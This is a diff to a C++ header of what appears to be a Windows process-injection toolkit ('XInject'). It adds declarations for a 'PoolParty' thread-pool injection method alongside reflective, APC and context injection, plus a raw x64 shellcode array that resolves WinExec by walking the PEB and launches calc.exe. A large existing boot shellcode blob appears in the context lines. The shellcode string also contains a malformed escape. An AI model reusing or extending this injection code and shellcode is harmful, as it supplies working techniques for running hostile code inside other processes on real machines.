@@ -6,6 +6,7 @@
 #include "include/utils/error.hpp"
 #include "include/app/S-Wisper.h"
 #include "include/app/network.hpp"
+#include "include/app/poolparty/PoolParty.hpp"
 
 #include <Windows.h>
 #include <winternl.h>
@@ -27,7 +28,7 @@ typedef struct _ProcessInfo
 {
 	DWORD pid;
 	std::wstring processName;
-} ProcessInfo, *pProcessInfo;
+} ProcessInfo, * pProcessInfo;
 
 namespace XInject
 {
@@ -48,11 +49,13 @@ namespace XInject
 		bool reflectInject(DWORD pid, int mode, std::string args = "");
 		namespace reflector
 		{
-			DWORD getOffset(HANDLE Image, CHAR *FuncName);
+			DWORD getOffset(HANDLE Image, CHAR* FuncName);
 			DWORD rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress);
 		}
 		bool apcInject(DWORD pid, int mode, std::string args = "");
 		bool contextInject(DWORD pid, int mode, std::string args = "");
+		bool poolPartyInject(DWORD pid, int mode, int method, std::string args);
+
 
 		inline unsigned char bootshellcode[3568] = {
 			0x48, 0x83, 0xEC, 0x28, 0xE8, 0x77, 0x00, 0x00, 0x00, 0x90, 0x48, 0x83,
@@ -352,9 +355,30 @@ namespace XInject
 			0x44, 0x02, 0x00, 0x00, 0x8B, 0x54, 0x24, 0x40, 0x48, 0x8D, 0x0D, 0x21,
 			0x04, 0x00, 0x00, 0xFF, 0x54, 0x24, 0x48, 0x33, 0xC0, 0x48, 0x83, 0xC4,
 			0x68, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
-			0xCC, 0xCC, 0xCC, 0xCC};
+			0xCC, 0xCC, 0xCC, 0xCC };
 		inline DWORD shellcodeSize = 3568;
 		inline DWORD Offset = 0xC5;
+
+		inline unsigned char g_Shellcode[] =
+			"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
+			"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
+			"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
+			"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
+			"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
+			"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
+			"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
+			"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
+			"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
+			"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
+			"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
+			"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
+			"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
+			"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
+			"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
+			"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
+			"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";
+
+		inline auto g_szShellcodeSize = sizeof(g_Shellcode);
 	}
 
 } // namespace XInject
